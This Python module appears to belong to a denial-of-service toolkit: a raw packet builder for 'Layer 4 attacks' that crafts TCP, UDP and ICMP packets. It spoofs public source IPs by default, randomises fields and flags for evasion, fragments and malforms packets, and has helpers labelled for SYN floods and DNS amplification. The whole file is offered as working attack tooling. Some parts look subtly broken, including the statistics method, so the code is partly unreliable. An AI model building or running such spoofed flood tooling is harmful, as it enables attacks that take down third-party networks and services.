"""
Advanced Packet Builder for Layer 4 Attacks
Professional packet crafting with spoofing and evasion capabilities
"""

import random
import socket
import struct
import time
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, field
from abc import ABC, abstractmethod

from core.utils import NetworkUtils, CryptoUtils
from core.logger import logger


@dataclass
class PacketConfig:
    """Configuration for packet building"""
    # IP layer
    source_ip: Optional[str] = None
    destination_ip: str = ""
    ip_version: int = 4
    ttl: int = 64
    tos: int = 0
    identification: Optional[int] = None
    flags: int = 0  # Don't Fragment = 2, More Fragments = 1
    fragment_offset: int = 0
    
    # Transport layer
    source_port: Optional[int] = None
    destination_port: int = 80
    protocol: str = "tcp"  # tcp, udp, icmp
    
    # TCP specific
    sequence_number: Optional[int] = None
    acknowledgment_number: Optional[int] = None
    tcp_flags: int = 0x02  # SYN flag
    window_size: int = 65535
    urgent_pointer: int = 0
    
    # UDP specific
    udp_length: Optional[int] = None
    
    # ICMP specific
    icmp_type: int = 8  # Echo Request
    icmp_code: int = 0
    icmp_identifier: int = 0
    icmp_sequence: int = 0
    
    # Payload
    payload: bytes = b""
    payload_size: int = 0
    
    # Evasion options
    randomize_fields: bool = True
    use_fragmentation: bool = False
    fragment_size: int = 8
    spoof_source: bool = True
    randomize_ports: bool = True
    
    # Advanced options
    custom_headers: Dict[str, Any] = field(default_factory=dict)
    checksum_errors: bool = False
    malformed_packets: bool = False


class PacketBuilder(ABC):
    """Abstract base class for packet builders"""
    
    def __init__(self, config: PacketConfig):
        self.config = config
        self.packet_count = 0
        
    @abstractmethod
    def build_packet(self) -> bytes:
        """Build a packet according to configuration"""
        pass
    
    @abstractmethod
    def build_header(self) -> bytes:
        """Build protocol-specific header"""
        pass
    
    def build_ip_header(self) -> bytes:
        """Build IP header"""
        # IP Header fields
        version = self.config.ip_version
        ihl = 5  # Internet Header Length (5 * 4 = 20 bytes)
        tos = self.config.tos
        total_length = 0  # Will be calculated later
        identification = self.config.identification or random.randint(1, 65535)
        flags_and_fragment = (self.config.flags << 13) | self.config.fragment_offset
        ttl = self.config.ttl
        protocol = self._get_protocol_number()
        checksum = 0  # Will be calculated later
        source_ip = self._get_source_ip()
        dest_ip = socket.inet_aton(self.config.destination_ip)
        
        # Pack IP header
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            (version << 4) | ihl,  # Version and IHL
            tos,
            total_length,
            identification,
            flags_and_fragment,
            ttl,
            protocol,
            checksum,
            socket.inet_aton(source_ip),
            dest_ip
        )
        
        return ip_header
    
    def calculate_checksum(self, data: bytes) -> int:
        """Calculate Internet checksum"""
        # Add padding if odd length
        if len(data) % 2:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        return ~checksum & 0xFFFF
    
    def _get_protocol_number(self) -> int:
        """Get protocol number for IP header"""
        protocol_map = {
            'tcp': 6,
            'udp': 17,
            'icmp': 1
        }
        return protocol_map.get(self.config.protocol.lower(), 6)
    
    def _get_source_ip(self) -> str:
        """Get source IP (spoofed or real)"""
        if self.config.source_ip:
            return self.config.source_ip
        
        if self.config.spoof_source:
            return self._generate_spoofed_ip()
        
        return NetworkUtils.get_local_ip()
    
    def _generate_spoofed_ip(self) -> str:
        """Generate spoofed IP address"""
        # Avoid private and reserved ranges for better spoofing
        while True:
            ip = f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            
            # Skip private ranges
            if (ip.startswith('10.') or 
                ip.startswith('192.168.') or 
                ip.startswith('172.') or
                ip.startswith('127.') or
                ip.startswith('169.254.')):
                continue
            
            return ip
    
    def _get_source_port(self) -> int:
        """Get source port"""
        if self.config.source_port:
            return self.config.source_port
        
        if self.config.randomize_ports:
            return random.randint(1024, 65535)
        
        return random.randint(32768, 65535)
    
    def _randomize_fields(self):
        """Randomize packet fields for evasion"""
        if not self.config.randomize_fields:
            return
        
        # Randomize IP fields
        if random.choice([True, False]):
            self.config.ttl = random.randint(32, 128)
        
        if random.choice([True, False]):
            self.config.tos = random.randint(0, 255)
        
        # Randomize identification
        self.config.identification = random.randint(1, 65535)


class TCPPacketBuilder(PacketBuilder):
    """TCP packet builder with advanced features"""
    
    def __init__(self, config: PacketConfig):
        super().__init__(config)
        self.config.protocol = "tcp"
    
    def build_packet(self) -> bytes:
        """Build complete TCP packet"""
        self._randomize_fields()
        
        # Build headers
        ip_header = self.build_ip_header()
        tcp_header = self.build_header()
        
        # Combine packet
        packet = ip_header + tcp_header + self.config.payload
        
        # Update total length in IP header
        total_length = len(packet)
        packet = packet[:2] + struct.pack('!H', total_length) + packet[4:]
        
        # Calculate and update IP checksum
        ip_checksum = self.calculate_checksum(packet[:20])
        packet = packet[:10] + struct.pack('!H', ip_checksum) + packet[12:]
        
        # Calculate and update TCP checksum
        tcp_checksum = self._calculate_tcp_checksum(packet)
        tcp_header_start = 20
        packet = (packet[:tcp_header_start + 16] + 
                 struct.pack('!H', tcp_checksum) + 
                 packet[tcp_header_start + 18:])
        
        self.packet_count += 1
        return packet
    
    def build_header(self) -> bytes:
        """Build TCP header"""
        source_port = self._get_source_port()
        dest_port = self.config.destination_port
        seq_num = self.config.sequence_number or random.randint(0, 4294967295)
        ack_num = self.config.acknowledgment_number or 0
        
        # TCP header length (5 * 4 = 20 bytes)
        data_offset = 5
        reserved = 0
        flags = self.config.tcp_flags
        
        # Apply flag randomization for evasion
        if self.config.randomize_fields:
            flags = self._randomize_tcp_flags(flags)
        
        window = self.config.window_size
        checksum = 0  # Will be calculated later
        urgent = self.config.urgent_pointer
        
        # Pack TCP header
        tcp_header = struct.pack(
            '!HHLLBBHHH',
            source_port,
            dest_port,
            seq_num,
            ack_num,
            (data_offset << 4) | reserved,
            flags,
            window,
            checksum,
            urgent
        )
        
        return tcp_header
    
    def _calculate_tcp_checksum(self, packet: bytes) -> int:
        """Calculate TCP checksum with pseudo header"""
        ip_header = packet[:20]
        tcp_segment = packet[20:]
        
        # Extract source and destination IP
        source_ip = ip_header[12:16]
        dest_ip = ip_header[16:20]
        
        # Create pseudo header
        pseudo_header = (source_ip + dest_ip + 
                        struct.pack('!BBH', 0, 6, len(tcp_segment)))
        
        # Calculate checksum
        checksum_data = pseudo_header + tcp_segment
        return self.calculate_checksum(checksum_data)
    
    def _randomize_tcp_flags(self, original_flags: int) -> int:
        """Randomize TCP flags for evasion"""
        # Common flag combinations for evasion
        evasion_flags = [
            0x02,  # SYN
            0x10,  # ACK
            0x18,  # PSH + ACK
            0x04,  # RST
            0x01,  # FIN
            0x08,  # PSH
            0x20,  # URG
        ]
        
        if random.randint(1, 100) <= 20:  # 20% chance to use evasion flags
            return random.choice(evasion_flags)
        
        return original_flags
    
    def create_syn_packet(self) -> bytes:
        """Create SYN packet for SYN flood"""
        self.config.tcp_flags = 0x02  # SYN flag
        self.config.sequence_number = random.randint(0, 4294967295)
        self.config.acknowledgment_number = 0
        return self.build_packet()
    
    def create_ack_packet(self) -> bytes:
        """Create ACK packet"""
        self.config.tcp_flags = 0x10  # ACK flag
        return self.build_packet()
    
    def create_rst_packet(self) -> bytes:
        """Create RST packet"""
        self.config.tcp_flags = 0x04  # RST flag
        return self.build_packet()
    
    def create_fin_packet(self) -> bytes:
        """Create FIN packet"""
        self.config.tcp_flags = 0x01  # FIN flag
        return self.build_packet()


class UDPPacketBuilder(PacketBuilder):
    """UDP packet builder"""
    
    def __init__(self, config: PacketConfig):
        super().__init__(config)
        self.config.protocol = "udp"
    
    def build_packet(self) -> bytes:
        """Build complete UDP packet"""
        self._randomize_fields()
        
        # Build headers
        ip_header = self.build_ip_header()
        udp_header = self.build_header()
        
        # Combine packet
        packet = ip_header + udp_header + self.config.payload
        
        # Update total length in IP header
        total_length = len(packet)
        packet = packet[:2] + struct.pack('!H', total_length) + packet[4:]
        
        # Calculate and update IP checksum
        ip_checksum = self.calculate_checksum(packet[:20])
        packet = packet[:10] + struct.pack('!H', ip_checksum) + packet[12:]
        
        # Calculate and update UDP checksum
        udp_checksum = self._calculate_udp_checksum(packet)
        udp_header_start = 20
        packet = (packet[:udp_header_start + 6] + 
                 struct.pack('!H', udp_checksum) + 
                 packet[udp_header_start + 8:])
        
        self.packet_count += 1
        return packet
    
    def build_header(self) -> bytes:
        """Build UDP header"""
        source_port = self._get_source_port()
        dest_port = self.config.destination_port
        length = self.config.udp_length or (8 + len(self.config.payload))
        checksum = 0  # Will be calculated later
        
        # Pack UDP header
        udp_header = struct.pack(
            '!HHHH',
            source_port,
            dest_port,
            length,
            checksum
        )
        
        return udp_header
    
    def _calculate_udp_checksum(self, packet: bytes) -> int:
        """Calculate UDP checksum with pseudo header"""
        ip_header = packet[:20]
        udp_segment = packet[20:]
        
        # Extract source and destination IP
        source_ip = ip_header[12:16]
        dest_ip = ip_header[16:20]
        
        # Create pseudo header
        pseudo_header = (source_ip + dest_ip + 
                        struct.pack('!BBH', 0, 17, len(udp_segment)))
        
        # Calculate checksum
        checksum_data = pseudo_header + udp_segment
        return self.calculate_checksum(checksum_data)
    
    def create_dns_packet(self, query: str = "example.com") -> bytes:
        """Create DNS query packet for amplification"""
        # DNS header
        dns_id = random.randint(1, 65535)
        flags = 0x0100  # Standard query
        questions = 1
        answers = 0
        authority = 0
        additional = 0
        
        dns_header = struct.pack('!HHHHHH', dns_id, flags, questions, answers, authority, additional)
        
        # DNS question
        query_parts = query.split('.')
        dns_question = b''
        for part in query_parts:
            dns_question += struct.pack('!B', len(part)) + part.encode()
        dns_question += b'\x00'  # End of name
        dns_question += struct.pack('!HH', 1, 1)  # Type A, Class IN
        
        self.config.payload = dns_header + dns_question
        self.config.destination_port = 53
        return self.build_packet()


class ICMPPacketBuilder(PacketBuilder):
    """ICMP packet builder"""
    
    def __init__(self, config: PacketConfig):
        super().__init__(config)
        self.config.protocol = "icmp"
    
    def build_packet(self) -> bytes:
        """Build complete ICMP packet"""
        self._randomize_fields()
        
        # Build headers
        ip_header = self.build_ip_header()
        icmp_header = self.build_header()
        
        # Combine packet
        packet = ip_header + icmp_header + self.config.payload
        
        # Update total length in IP header
        total_length = len(packet)
        packet = packet[:2] + struct.pack('!H', total_length) + packet[4:]
        
        # Calculate and update IP checksum
        ip_checksum = self.calculate_checksum(packet[:20])
        packet = packet[:10] + struct.pack('!H', ip_checksum) + packet[12:]
        
        # Calculate and update ICMP checksum
        icmp_checksum = self.calculate_checksum(packet[20:])
        icmp_header_start = 20
        packet = (packet[:icmp_header_start + 2] + 
                 struct.pack('!H', icmp_checksum) + 
                 packet[icmp_header_start + 4:])
        
        self.packet_count += 1
        return packet
    
    def build_header(self) -> bytes:
        """Build ICMP header"""
        icmp_type = self.config.icmp_type
        code = self.config.icmp_code
        checksum = 0  # Will be calculated later
        identifier = self.config.icmp_identifier or random.randint(1, 65535)
        sequence = self.config.icmp_sequence or random.randint(1, 65535)
        
        # Pack ICMP header
        icmp_header = struct.pack(
            '!BBHHH',
            icmp_type,
            code,
            checksum,
            identifier,
            sequence
        )
        
        return icmp_header
    
    def create_ping_packet(self) -> bytes:
        """Create ICMP ping packet"""
        self.config.icmp_type = 8  # Echo Request
        self.config.icmp_code = 0
        self.config.payload = b'A' * 32  # Standard ping payload
        return self.build_packet()
    
    def create_unreachable_packet(self) -> bytes:
        """Create ICMP destination unreachable packet"""
        self.config.icmp_type = 3  # Destination Unreachable
        self.config.icmp_code = 1  # Host Unreachable
        return self.build_packet()


class FragmentedPacketBuilder:
    """Builder for fragmented packets"""
    
    def __init__(self, packet_builder: PacketBuilder, fragment_size: int = 8):
        self.packet_builder = packet_builder
        self.fragment_size = fragment_size
    
    def build_fragmented_packets(self) -> List[bytes]:
        """Build fragmented packets"""
        # Build original packet
        original_packet = self.packet_builder.build_packet()
        
        # Extract IP header and payload
        ip_header = original_packet[:20]
        payload = original_packet[20:]
        
        fragments = []
        offset = 0
        identification = struct.unpack('!H', ip_header[4:6])[0]
        
        while offset < len(payload):
            # Calculate fragment size
            fragment_data = payload[offset:offset + self.fragment_size]
            
            # Set fragment flags
            more_fragments = 1 if (offset + self.fragment_size) < len(payload) else 0
            flags_and_offset = (more_fragments << 13) | (offset // 8)
            
            # Build fragment IP header
            fragment_header = (
                ip_header[:4] +  # Version, IHL, TOS, Total Length (will be updated)
                struct.pack('!H', identification) +  # Identification
                struct.pack('!H', flags_and_offset) +  # Flags and Fragment Offset
                ip_header[8:20]  # TTL, Protocol, Checksum, Source IP, Dest IP
            )
            
            # Update total length
            total_length = 20 + len(fragment_data)
            fragment_header = fragment_header[:2] + struct.pack('!H', total_length) + fragment_header[4:]
            
            # Calculate IP checksum
            ip_checksum = self.packet_builder.calculate_checksum(fragment_header)
            fragment_header = fragment_header[:10] + struct.pack('!H', ip_checksum) + fragment_header[12:]
            
            # Combine fragment
            fragment = fragment_header + fragment_data
            fragments.append(fragment)
            
            offset += self.fragment_size
        
        return fragments


class AdvancedPacketBuilder:
    """Advanced packet builder with multiple techniques"""
    
    def __init__(self):
        self.builders = {
            'tcp': TCPPacketBuilder,
            'udp': UDPPacketBuilder,
            'icmp': ICMPPacketBuilder
        }
    
    def create_builder(self, protocol: str, config: PacketConfig) -> PacketBuilder:
        """Create appropriate packet builder"""
        builder_class = self.builders.get(protocol.lower())
        if not builder_class:
            raise ValueError(f"Unsupported protocol: {protocol}")
        
        return builder_class(config)
    
    def create_malformed_packet(self, protocol: str, config: PacketConfig) -> bytes:
        """Create malformed packet for evasion"""
        builder = self.create_builder(protocol, config)
        packet = builder.build_packet()
        
        # Apply malformation techniques
        if config.malformed_packets:
            packet = self._apply_malformation(packet)
        
        return packet
    
    def create_fragmented_attack(self, protocol: str, config: PacketConfig, 
                                fragment_size: int = 8) -> List[bytes]:
        """Create fragmented packet attack"""
        builder = self.create_builder(protocol, config)
        fragmenter = FragmentedPacketBuilder(builder, fragment_size)
        return fragmenter.build_fragmented_packets()
    
    def _apply_malformation(self, packet: bytes) -> bytes:
        """Apply packet malformation techniques"""
        malformed = bytearray(packet)
        
        # Random bit flips
        for _ in range(random.randint(1, 3)):
            pos = random.randint(20, len(malformed) - 1)  # Skip IP header
            bit_pos = random.randint(0, 7)
            malformed[pos] ^= (1 << bit_pos)
        
        # Invalid header lengths
        if random.choice([True, False]):
            # Modify IP header length
            malformed[0] = (malformed[0] & 0xF0) | random.randint(0, 15)
        
        return bytes(malformed)
    
    def get_packet_stats(self) -> Dict[str, int]:
        """Get packet building statistics"""
        return {
            'total_packets': sum(builder.packet_count for builder in self.builders.values() if hasattr(builder, 'packet_count')),
            'protocols_used': len(self.builders)
        }